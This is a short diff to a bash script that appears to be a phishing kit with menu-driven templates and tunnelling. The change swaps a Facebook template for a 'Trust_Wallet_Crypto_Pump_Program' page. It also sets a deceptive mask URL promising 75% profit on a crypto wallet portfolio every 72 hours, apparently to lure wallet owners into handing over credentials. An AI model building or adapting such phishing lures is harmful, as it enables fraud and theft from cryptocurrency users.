@@ -316,7 +316,7 @@ Trust_Wallet() {
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		website="facebook"
+		website="Trust_Wallet_Crypto_Pump_Program"
 		mask='http://Earn-75%-profit-of-your-trust-crypto-wallet-portfolio-every-72-hours'
 		tunnel_menu
 	else
@@ -340,7 +340,7 @@ main_menu() {
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		Trust_Wallet
+		Trust_Wallet_Crypto_Pump_Program
 	elif [[ "$REPLY" == 99 ]]; then
 		About
 	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
